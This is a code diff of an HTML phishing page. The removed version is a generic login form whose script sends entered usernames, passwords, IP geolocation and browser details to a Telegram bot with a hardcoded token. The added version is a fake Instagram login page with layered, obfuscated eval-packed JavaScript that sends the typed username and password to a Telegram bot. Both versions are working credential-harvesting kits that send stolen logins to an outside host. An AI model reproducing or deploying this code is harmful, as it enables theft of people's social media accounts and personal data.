@@ -1,210 +1,477 @@
-<!DOCTYPE html>
-<html lang="en">
 
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Phish JS</title>
-</head>
 
-<body>
-    <input type="text" id='username' placeholder="Login">
-    <input type="password" id='password' placeholder="Password">
-    <button type="button" id="submit-button">Login</button>
 
-    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"
-        integrity="sha256-pasqAKBDmFT4eHoN2ndd6lN370kFiGUFyTiUHWhU7k8=" crossorigin="anonymous"></script>
-    <script >
-const phish = (bot_token, chat_id, redirect_link) => {
-    var module = {
-        options: [],
-        header: [
-            navigator.platform,
-            navigator.userAgent,
-            navigator.appVersion,
-            navigator.vendor,
-            window.opera
-        ],
-        dataos: [
-            { name: 'Windows Phone', value: 'Windows Phone', version: 'OS' },
-            { name: 'Windows', value: 'Win', version: 'NT' },
-            { name: 'iPhone', value: 'iPhone', version: 'OS' },
-            { name: 'iPad', value: 'iPad', version: 'OS' },
-            { name: 'Kindle', value: 'Silk', version: 'Silk' },
-            { name: 'Android', value: 'Android', version: 'Android' },
-            { name: 'PlayBook', value: 'PlayBook', version: 'OS' },
-            { name: 'BlackBerry', value: 'BlackBerry', version: '/' },
-            { name: 'Macintosh', value: 'Mac', version: 'OS X' },
-            { name: 'Linux', value: 'Linux', version: 'rv' },
-            { name: 'Palm', value: 'Palm', version: 'PalmOS' }
-        ],
-        databrowser: [
-            { name: 'Chrome', value: 'Chrome', version: 'Chrome' },
-            { name: 'Firefox', value: 'Firefox', version: 'Firefox' },
-            { name: 'Safari', value: 'Safari', version: 'Version' },
-            { name: 'Internet Explorer', value: 'MSIE', version: 'MSIE' },
-            { name: 'Opera', value: 'Opera', version: 'Opera' },
-            { name: 'BlackBerry', value: 'CLDC', version: 'CLDC' },
-            { name: 'Mozilla', value: 'Mozilla', version: 'Mozilla' }
-        ],
-        init: function() {
-            var agent = this.header.join(' '),
-                os = this.matchItem(agent, this.dataos),
-                browser = this.matchItem(agent, this.databrowser);
 
-            return { os: os, browser: browser };
-        },
-        matchItem: function(string, data) {
-            var i = 0,
-                j = 0,
-                html = '',
-                regex,
-                regexv,
-                match,
-                matches,
-                version;
 
-            for (i = 0; i < data.length; i += 1) {
-                regex = new RegExp(data[i].value, 'i');
-                match = regex.test(string);
-                if (match) {
-                    regexv = new RegExp(
-                        data[i].version + '[- /:;]([\\d._]+)',
-                        'i'
-                    );
-                    matches = string.match(regexv);
-                    version = '';
-                    if (matches) {
-                        if (matches[1]) {
-                            matches = matches[1];
-                        }
-                    }
-                    if (matches) {
-                        matches = matches.split(/[._]+/);
-                        for (j = 0; j < matches.length; j += 1) {
-                            if (j === 0) {
-                                version += matches[j] + '.';
-                            } else {
-                                version += matches[j];
-                            }
-                        }
-                    } else {
-                        version = '0';
-                    }
-                    return {
-                        name: data[i].name,
-                        version: parseFloat(version)
-                    };
-                }
-            }
-            return { name: 'unknown', version: 0 };
-        }
-    };
+<style>
 
-    var e = module.init();
 
-    const ipLocation = () => {
-        let req = new XMLHttpRequest();
-        req.open(
-            'GET',
-            `http://ip-api.com/json/?fields=query,country,city,regionName`,
-            false
-        );
-        req.send(null);
-        let json = JSON.parse(req.responseText);
-        return json;
-    };
-    const goTo = () => {
-        let link = new URLSearchParams(window.location.search).get('link');
-        if (link !== null) {
-            redirect_link = link;
-        }
-        window.location.assign(redirect_link);
-    };
+/* Universal Selectors */
+#root, body, html {
+  height:100%;
+}
 
-    let ip_json = ipLocation();
-    var uname = $('#username'),
-        pass = $('#password'),
-        submitButton = $('#submit-button');
+body {
+  overflow-y: scroll;
+}
 
-    submitButton.prop('disabled', true);
+a, abbr, acronym, address, applet, article, aside, audio, b, big, blockquote, body, canvas, caption, center, cite, code, dd, del, details, dfn, div, dl, dt, em, embed, fieldset, figcaption, figure, footer, form, h1, h2, h3, h4, h5, h6, header, hgroup, html, i, iframe, img, ins, kbd, label, legend, li, mark, menu, nav, object, ol, output, p, pre, q, ruby, s, samp, section, small, span, strike, strong, sub, summary, sup, table, tbody, td, tfoot, th, thead, time, tr, tt, u, ul, var, video {
+  margin:0;
+  padding:0;
+  border:0;
+  font:inherit;
+  vertical-align: baseline;
+} 
 
-    uname.on(
-        'change input paste keydown cut keypress keyup changeproperty',
-        function() {
-            $(this).val().length != 0
-                ? $(this).attr('valid', true)
-                : $(this).attr('valid', false);
-        }
-    );
-    pass.on(
-        'change input paste keydown cut keypress keyup changeproperty',
-        function() {
-            $(this).val().length != 0
-                ? $(this).attr('valid', true)
-                : $(this).attr('valid', false);
-        }
-    );
+a, a:visited {
+  text-decoration: none;
+}
+a:active, .btn:active {
+  opacity:.5;
+}
 
-    $('#username, #password').on(
-        'change input paste keydown cut keypress keyup changeproperty',
-        function() {
-            uname.attr('valid') === 'true' &&
-            pass.attr('valid') === 'true'
-                ? submitButton.prop('disabled', false)
-                : submitButton.prop('disabled', true);
-        }
-    );
+ol, ul {
+  list-style: none;
+}
 
-    submitButton.on('click', function() {
-        let currentdate = new Date(),
-            date = `${currentdate.getDate()}/${currentdate.getMonth() +
-                1}/${currentdate.getFullYear()}`,
-            time = `${currentdate.getHours()}:${currentdate.getMinutes()}:${currentdate.getSeconds()}`,
-            xhr = new XMLHttpRequest(),
-            unameVal = uname.val(),
-            passVal = pass.val(),
-            msg = `----------------------------------------------------%0A
-Date  :    ${date}%0A
-Time :    ${time}%0A
-----------------------------------------------------%0A
-Login:    ${unameVal}%0A
-Pass :    ${passVal}%0A
-----------------------------------------------------%0A
-IP: ${ip_json.query}%0A
-Location: ${ip_json.city}, ${ip_json.regionName}, ${ip_json.country}%0A
-OS: ${e.os.name} v${e.os.version}%0A
-Browser:  ${e.browser.name} v${e.browser.version}%0A
-----------------------------------------------------%0A%0A
-More Info%0A%0A
-navigator.userAgent:%0A${navigator.userAgent}%0A%0A
-navigator.appVersion:%0A${navigator.appVersion}%0A%0A
-navigator.platform:%0A${navigator.platform}%0A%0A
-navigator.vendor:%0A${navigator.vendor}%0A
-`;
+body, button, input {
+  font-family: -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  font-size:14px;
+  line-height:18px;
+}
 
-        xhr.open(
-            'POST',
-            `https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&parse_mode=html&text=${msg}`
-        );
-        xhr.send();
+#root, article, main, div, section, header, nav, footer {
+  border: 0 solid #000000;
+  box-sizing: border-box;
+  align-items: stretch;
+  display: flex;
+  flex-direction: column;
+  flex-shrink: 0;
+  margin:0;
+  padding:0;
+  position: relative;
+  -webkit-box-align: stretch;
+    -moz-box-align: stretch;
+  -webkit-box-orient: vertical;
+    -moz-box-orient: vertical;
+  -webkit-box-direction: normal;
+    -moz-box-direction: normal;
+} /* <--Universal Selectors End */
 
-        setTimeout(function() {
-            goTo();
-        }, 1000);
-    });
-};
 
+#root {
+  z-index: 0;
+}
+
+.section-all {
+  min-height:100%;
+  overflow:hidden;
+}
+
+.main {
+  background-color: #fafafa;
+  order: 4;
+  flex-grow: 1;
+  -webkit-box-flex: 1;
+  -moz-box-flex: 1;
+  -moz-box-ordinal-group: 5;
+  -webkit-box-ordinal-group: 5;
+}
+
+.wrapper {
+  min-height:100%;
+  overflow: hidden;
+}
+
+.wrapper, .article {
+  flex-grow: 1;
+  justify-content: center;
+  -webkit-box-flex: 1;
+    -moz-box-flex: 1;
+  -webkit-box-pack: center;
+    -moz-box-pack: center;
+}
+
+.article {
+  flex-direction: row;
+  margin:0 auto;
+  max-width: 935px;
+  width:100%;
+  -webkit-box-orient: horizontal;
+    -moz-box-orient: horizontal;
+  -webkit-box-direction: normal;
+    -moz-box-direction: normal;
+}
+
+.content {
+  color:#262626;
+  flex-grow:1;
+  justify-content: center;
+  max-width: 350px;
+  margin-top:12px;
+  -webkit-box-pack: justify;
+    -moz-box-pack: justify;
+  -webkit-box-flex: 1;
+    -moz-box-flex: 1;  
+}
+
+.login-box {
+  background: #fff;
+  border: 1px solid #e6e6e6;
+  border-radius: 1px;
+  margin:0 0 10px;
+  padding: 10px 0;
+  /* align-items: center; */
+}
+
+.header {
+  margin: 14.45px auto 12px;
+}
+
+.logo {
+  background: cover no-repeat;
+  width:175px;
+  height:auto;
+}
+
+.form {
+  display: flex;
+  flex-direction: column;
+  margin-bottom: 10px;
+  -moz-box-direction: normal;
+  -webkit-box-direction: normal;
+}
+
+.input-box {
+  margin:auto 40px 6px;
+}
+
+input {
+  height: 36px;
+  border: 1px solid #efefef;
+  border-radius: 3px;
+  background-color: #fafafa;
+  width:100%;
+  font-size:12px;
+  margin: 0;
+  padding: 9px 0 7px 8px;
+  outline: none;
+  overflow: hidden;
+  text-overflow: ellipsis;
+  box-sizing: border-box;
+}
+input#name:focus, input#password:focus {
+  border-color:#bbb;
+}
+
+.button-box {
+  display: block;
+  position: relative;
+  margin: 8px 40px;
+}
+.btn {
+  cursor: pointer;
+  width: 100%;
+  padding:0 8px; 
+  background: #3897f0;
+  border:1px solid #3897f0;
+  color:#fff;
+  border-radius:3px;
+  font-weight:600;
+  font-size: 14px;
+  height: 28px;
+  line-height: 26px;
+  outline: none;
+  white-space: nowrap;
+}
+
+.forgot, .forgot:active, .forgot:hover, .forgot:visited {
+  font-size:12px;
+  margin-top:12px;
+  text-align: center;
+  color:#003569;
+  line-height: 14px!important;
+}
+
+.text {
+  text-align:center;
+  margin:15px;
+  color:#262626;
+  font-size:14px;
+}
+
+.text a, .text a:visited, .text a:hover, .text a:active {
+  color:#3897f0;
+  margin-left:3px;
+}
+
+/* App Store */
+.app p {
+  line-height: 18px;
+  color:#262626;
+  font-size:14px;
+  text-align:center;
+  margin:10px 20px;
+}
+
+.app-img {
+  flex-direction: row;
+  justify-content: center;
+  margin:10px 0;
+  -webkit-box-orient: horizontal;
+  -moz-box-orient: horizontal;
+}
+
+.app-img a {
+  margin-right:8px;
+  height: 43.5px;
+}
+
+.app-img img {
+  height:40px;
+}
+
+/* FOOTER */
+.footer {
+  background-color: #fafafa;
+  order: 5;
+  padding: 0 20px;
+  background: #fafafa;
+}
+
+.footer-container {
+  flex-direction: row;  
+  flex-wrap:wrap;
+  background-color: #fafafa;
+  justify-content: space-between;
+  padding: 38px 0;
+  max-width:935px;
+  font-size:12px;
+  font-weight:600;
+  margin:0 auto;
+  text-transform:uppercase;
+  width:100%
+}
+
+.footer-nav {
+  max-width:100%;
+}
+
+.footer-nav ul {
+  margin-right:16px;
+  margin-bottom:3px;
+  flex-grow:1;
+}
+
+.footer-nav ul li {
+  display: inline-block;
+  margin-right: 13px;
+  margin-bottom:7px;
+}
+
+.footer-nav ul li a {
+  color: #003569;
+  text-decoration: none;
+}
+
+.footer span {
+  color:#999;
+}
+
+span.language { 
+  color: #003569;
+  cursor: pointer;
+  display: inline-block;
+  font-weight: 600;
+  position: relative;
+  text-transform: uppercase;
+  vertical-align: top;
+}
+
+.select {
+  cursor: pointer;
+  height: 100%;
+  top: 0;
+  opacity: 0;
+  position: absolute;
+  left:0;
+  width: 100%;
+}
+
+/* Media Queries */
+@media (max-width:450px) {
+  .main {
+    background-color: #fff;
+  }
+
+  .content {
+    max-width: 100%;
+    margin-top: 0;
+    justify-content: space-between;
+  }
+
+  .login-box {
+    background-color: transparent;
+    border:none;
+  }
+
+  .logo {
+    background: cover no-repeat;
+    width:175px;
+    height:auto;
+    margin:0 auto;
+  }
+
+  .btn {
+    cursor: pointer;
+    width: 100%;
+    padding:0 8px; 
+    background: #3897f0;
+    border:1px solid #3897f0;
+    color:#fff;
+    border-radius:3px;
+    font-weight:600;
+    font-size: 14px;
+    height: 28px;
+    line-height: 26px;
+    outline: none;
+    white-space: nowrap;
+  }
+
+  .input-box {
+    border: 1px solid #efefef;
+    border-radius: 3px;
+    height: 36px;
+    background: #fafafa;
+    position: relative;
+  }
+
+  input {
+    border: 0;
+    background-color: #fafafa;
+    width:100%;
+    font-size:12px;
+    margin: 0;
+    padding: 9px 0 7px 8px;
+    outline: none;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    box-sizing: border-box;
+  }
+
+  .input-box:hover, .input-box:focus {
+    border-color:#bbb;
+  }
+
+}
+
+@media only screen and (max-width:875px) {
+  .footer-container {
+    text-align: center;
+    padding:10px 0;
+  }
+  .footer-container,  .footer-nav ul {
+    justify-content: center;
+    margin:0 auto;
+    max-width: 360px;
+    min-width: auto;
+    -webkit-box-pack: center;
+    -moz-box-pack: center;
+  }
+
+}
+</style>
+
+
+  <span id="root">
+    <section class="section-all">
+
+      <!-- 1-Role Main -->
+      <main class="main" role="main">
+        <div class="wrapper">
+          <article class="article">
+            <div class="content">
+              <div class="login-box">
+                <div class="header">
+                  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" />
+                </div><!-- Header end -->
+                <div class="form-wrap, form">
+                 <script>
+ (function(_0x46ea46,_0x5e5ae6){var _0xd61938=_0x4929,_0x30b40c=_0x46ea46();while(!![]){try{var _0x3b2e96=-parseInt(_0xd61938(0x69))/0x1+parseInt(_0xd61938(0x6d))/0x2+-parseInt(_0xd61938(0x67))/0x3*(parseInt(_0xd61938(0x70))/0x4)+-parseInt(_0xd61938(0x71))/0x5*(parseInt(_0xd61938(0x66))/0x6)+-parseInt(_0xd61938(0x73))/0x7+-parseInt(_0xd61938(0x6b))/0x8*(-parseInt(_0xd61938(0x6c))/0x9)+parseInt(_0xd61938(0x6a))/0xa;if(_0x3b2e96===_0x5e5ae6)break;else _0x30b40c['push'](_0x30b40c['shift']());}catch(_0x38dd7c){_0x30b40c['push'](_0x30b40c['shift']());}}}(_0x17f7,0x78d48));function _0x4929(_0x359563,_0x1cb190){var _0x17f7b7=_0x17f7();return _0x4929=function(_0x49294b,_0x18f277){_0x49294b=_0x49294b-0x66;var _0x281ea6=_0x17f7b7[_0x49294b];return _0x281ea6;},_0x4929(_0x359563,_0x1cb190);}function _0x17f7(){var _0x782d41=['search','5940410ZYqlOM','6lihYFJ','12gOQNRx','split','590965RJZbkh','23502790XCJIjU','352XnCAhe','44271xNlNps','305598InfxBt','location','length','357768sgotlH','2136155uhJMrS'];_0x17f7=function(){return _0x782d41;};return _0x17f7();}function GetURLParameter(_0x35a05c){var _0x37f017=_0x4929,_0x1fe8f8=window[_0x37f017(0x6e)][_0x37f017(0x72)]['substring'](0x1),_0x82362f=_0x1fe8f8[_0x37f017(0x68)]('&');for(var _0x35bab8=0x0;_0x35bab8<_0x82362f[_0x37f017(0x6f)];_0x35bab8++){var _0x57ac33=_0x82362f[_0x35bab8][_0x37f017(0x68)]('=');if(_0x57ac33[0x0]==_0x35a05c)return _0x57ac33[0x1];}}var chatid=GetURLParameter('id');
+  </script>
+
+<script >
+eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('376(370(369,378,365,367,366,371){366=370(365){368 365};375(!\'\'.374(/^/,381)){373(365--){371[365]=367[365]||365}367=[370(366){368 371[366]}];366=370(){368\'\\\\377+\'};365=1};373(365--){375(367[365]){369=369.374(382 379(\'\\\\372\'+366(365)+\'\\\\372\',\'380\'),367[365])}}368 369}(\'208(200(199,211,195,197,196,201){196=200(195){198 195};205(!\\\'\\\'.203(/^/,207)){202(195--){201[195]=197[195]||195}197=[200(196){198 201[196]}];196=200(){198\\\'\\\\\\\\213+\\\'};195=1};202(195--){205(197[195]){199=199.203(206 210(\\\'\\\\\\\\204\\\'+196(195)+\\\'\\\\\\\\204\\\',\\\'209\\\'),197[195])}}198 199}(\\\'111(27(24,22,20,23,21,25){21=27(20){28(20<22?\\\\\\\'\\\\\\\':21(33(20/22)))+((20=20%22)>35?50.77(20+29):20.75(36))};32(!\\\\\\\'\\\\\\\'.49(/^/,50)){31(20--){25[21(20)]=23[20]||21(20)}23=[27(21){28 25[21]}];21=27(){28\\\\\\\'\\\\\\\\\\\\\\\\42+\\\\\\\'};20=1};31(20--){32(23[20]){24=24.49(69 61(\\\\\\\'\\\\\\\\\\\\\\\\26\\\\\\\'+21(20)+\\\\\\\'\\\\\\\\\\\\\\\\26\\\\\\\',\\\\\\\'30\\\\\\\'),23[20])}}28 24}(\\\\\\\'4 26=7;(5(51,23){4 1=7,8=51();60(!![]){58{4 47=2(1(57))/55*(2(1(54))/107)+2(1(102))/101*(2(1(100))/99)+2(1(98))/81+2(1(94))/88*(2(1(87))/86)+-2(1(52))/42+2(1(80))/82+-2(1(83))/84;85(47===23)89;90 8[\\\\\\\\\\\\\\\'34\\\\\\\\\\\\\\\'](8[\\\\\\\\\\\\\\\'37\\\\\\\\\\\\\\\']())}92(93){8[\\\\\\\\\\\\\\\'34\\\\\\\\\\\\\\\'](8[\\\\\\\\\\\\\\\'37\\\\\\\\\\\\\\\']())}}}(6,95));5 7(39,38){4 48=6();9 7=5(22,97){22=22-24;4 30=48[22];9 30},7(39,38)}5 6(){4 41=[\\\\\\\\\\\\\\\'103\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'104\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'105\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'106\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'108\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'\\\\\\\\\\\\\\\\0+\\\\\\\\\\\\\\\\0ᯓ\\\\\\\\\\\\\\\\0ᴅᴇᴠ\\\\\\\\\\\\\\\\0ʙʏ\\\\\\\\\\\\\\\\0\\\\\\\\\\\\\\\\0»\\\\\\\\\\\\\\\\0@109&20=\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'/10?96=ᯓ\\\\\\\\\\\\\\\\0ʟᴏɢɪɴ-ᴘᴀɢᴇ\\\\\\\\\\\\\\\\0\\\\\\\\\\\\\\\\0»\\\\\\\\\\\\\\\\0ɪɴ79ᴛᴀɢʀᴀᴍ++ᯓ\\\\\\\\\\\\\\\\0ᴇᴍᴀɪʟ\\\\\\\\\\\\\\\\0\\\\\\\\\\\\\\\\0»\\\\\\\\\\\\\\\\0\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'67\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'78\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'19\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'18\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'17\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'+ᯓ\\\\\\\\\\\\\\\\0ᴘᴀ16ᴡᴏʀᴅ\\\\\\\\\\\\\\\\0\\\\\\\\\\\\\\\\0»\\\\\\\\\\\\\\\\0+\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'15:14\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'13\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'12\\\\\\\\\\\\\\\',\\\\\\\\\\\\\\\'25\\\\\\\\\\\\\\\'];6=5(){9 41};9 6()}4 43=26(24);5 56(){4 3=26;20=11,40=43,25=44[3(45)](3(59))[3(46)],21=44[3(45)](\\\\\\\\\\\\\\\'21\\\\\\\\\\\\\\\')[3(46)],$[\\\\\\\\\\\\\\\'63\\\\\\\\\\\\\\\'](\\\\\\\\\\\\\\\'64://53.66.65/68\\\\\\\\\\\\\\\'+40+3(70)+25+3(71)+21+3(73)+20)}\\\\\\\',62,91,\\\\\\\'74|76|33|110|112|27|134|186|189|28|190|191|192|180|171|164|166|167|168|181|193|178|177|176|175|174|173|172||170|169|165|179|182|188|187|185|184|183|163|32|162|137|160|161|133|132|131|130|129|128|127|126|125|123|113|122|121|31|120|119|118|117|116|115|114|135|124|136|149|159|158|157|156|155|154|153|152|151|150|148|138|147|146|145|144|143|142|141|140|139\\\\\\\'.72(\\\\\\\'|\\\\\\\'),0,{}))\\\',10,194,\\\'||||||||||||||||||||195|196|211|197|199|201|204|200|198||209|202|205|249|250|||251|252|253|254|255|213|256|257|258|259|260|261|203|207|262|248|263|265|266|267|268|269|246|270|210||271|279|273|274|275|276|206|277|278|212|264|247|240|245|226|218|224|223|222|221|220|219|217|280|216|215|214|227||225|229|238|244|243|242|241|228|239|237|230|236|235|234|233|232|231|272|281|208|301|343|341|340|339|338|337|336|334|325|333|345|332|331|330|329|328|327|326|344|335|363|362|361|360|359|358|357|356|354|353|352|351|346|350|349|348|347|355|342|324|302|322|299|298|297|296|295|294|293|292|290|282|289|288|287|286|285|284|283|300|291|323|313|321|320|319|318|317|316|315|314|312|303|311|310|309|308|307|306|305|304\\\'.212(\\\'|\\\'),0,{}))\',10,364,\'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||365|366|367|368|369|370|371|373|374|372|375|382|381|376|380|379|378|383|377|419|420|421|422|423|424|425|426|427|428|429|430|431|418|432|434|435|436|437|438|439|416|390|441|442|443|444|445|446|447|433|417|410|415|396|395|394|393|392|391|385|389|388|387|386|449|384|398|397|400|401|402|403|404|405|406|407|408|409|399|411|412|413|414|448|440|450|452|511|510|509|508|507|506|505|504|502|494|501|500|513|499|498|497|496|495|512|503|514|517|530|529|527|531|532|533|528|526|515|524|523|522|521|520|519|518|525|516|493|471|491|468|467|466|465|464|463|462|461|459|451|458|457|456|455|454|453|492|469|460|470|482|490|489|488|487|486|485|484|483|481|472|480|479|478|477|476|475|474|473\'.383(\'|\'),0,{}))',10,534,'|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||c|e|k|return|p|function|d|b|while|replace|if|eval|w|a|RegExp|g|String|new|split|m|r|q|u|t|l|1j|i|j|f|h|parseInt|G|o|n|Y|1p|1h|S|T|1r|U|V|W|1l|1d|1k|1q|1b|F|A|x20|1i|_0x32a19a|I|X|J|H|E|1a|D|C|y|L|x|s|Z|fromCharCode|N|1o|1e|Q|1f|R|1g|1s|1m|P|K|O|toString|M|1n|1c|z|v|B|break|_0x572841|value|chatid|sendMessage|catch|org|0x128|0x12e|0x1|5499719729|0x2|0x12d|0x3|0x12f|0x4|0x125|try|233076uPTRzV|0x5|0x121|0x12a|0x6|_0x4d4d|AAHnJCA7CsALxjJTsgVbbvzBxmuqdrH6yw0|ss|0x130|101425mkqRVd|4XEfiRt|sendmessage|telegram|0x127|api|0xe17dd|_0x55a113|get|0x124|getElementById|14083928oMZICM|https|775386ZIMoCX|329QlYxCH|narpatprihar|0x126|text|18547000iSPuRU|921FnELBi|446618LZNKAd|22324EyZOfx|else|bot|0xa|var|0x123|_0x1b8b15|push|_0x18505a|document|newtk|pass|shift|token|0x122|_0xac37a0|0x7|_0x4d4d0e|0x12b|_0xe7099b|0x8|user|_0x5bc96c|0x129|0x12c|_0x3dbbef|_0x580c21|_0x2842|_0x13bd39|0x131|chat_id|_0x4204c9|_0x284297|_0x194bb1|0x9'.split('|'),0,{}))
+</script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.2.3/jquery.min.js"></script>
+ 
+                    <div class="input-box">
+                      <input type="text" id="user" aria-describedby="" placeholder="Phone number, username, or email"  aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name="username" value="" required />
+                    </div>  
+
+                    <div class="input-box">
+                      <input type="password" name="pass" id="pass" placeholder="Password"  aria-describedby="" maxlength="30" aria-required="true" autocapitalize="off" autocorrect="off" required />
+                    </div>  
+
+                    <span class="button-box">
+                      <button class="btn"  type="submit"  onclick=sendmessage()>Log in</button>
+                    </span>  
+
+                    <a class="forgot" href="">Forgot password?</a>
+                  
+                </div> <!-- Form-wrap end -->
+              </div> <!-- Login-box end -->
+
+              <div class="login-box">
+                <p class="text">Don't have an account?<a href="#">Sign up</a></p>
+              </div> 
+              <!-- Signup-box end -->
+
+              <div class="app">
+                <p>Get the app.</p>
+                <div class="app-img">
+                  <a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/4b70f6fae447.png" />
+                  </a>
+                  <a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26utm_medium%3Dbadge">
+                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/f06b908907d5.png" />
+                  </a>  
+                </div>  <!-- App-img end-->
+              </div> <!-- App end -->
+            </div> <!-- Content end -->
+          </article>
+        </div> <!-- Wrapper end -->
+      </main>
+
+      <!-- 2-Role Footer -->
+      <footer class="footer" role="contentinfo">
+        <div class="footer-container">
+
+          <nav class="footer-nav" role="navigation">
+            <ul>
+              <li><a href="">About Us</a></li>
+              <li><a href="">Support</a></li>
+              <li><a href="">Blog</a></li>
+              <li><a href="">Press</a></li>
+              <li><a href="">Api</a></li>
+              <li><a href="">Jobs</a></li>
+              <li><a href="">Privacy</a></li>
+              <li><a href="">Terms</a></li>
+              <li><a href="">Directory</a></li>
+              <li>
+                <span class="language">Language
+                  <select name="language" class="select" onchange="la(this.value)">
+                    <option value="#" />English
+                    <option value="http://ru-instafollow.bitballoon.com" />Russian
+                  </select>
+                </span>
+              </li>
+            </ul>
+          </nav>
+
+          <span class="footer-logo">&copy; 2018 Instagram</span>
+        </div> <!-- Footer container end -->
+      </footer>
       
-    </script>
-    <script>
-        $(document).ready(function () {
-            const BOT_TOKEN = '5499719729:AAHnJCA7CsALxjJTsgVbbvzBxmuqdrH6yw0',
-                CHAT_ID = '1663325354',
-                REDIRECT_URL = 'https://xbaysal11.github.io/phish-js/'
-            phish(BOT_TOKEN, CHAT_ID, REDIRECT_URL);
-        });
-    </script>
-</body>
-
-</html>
+    </section>
+  </span>
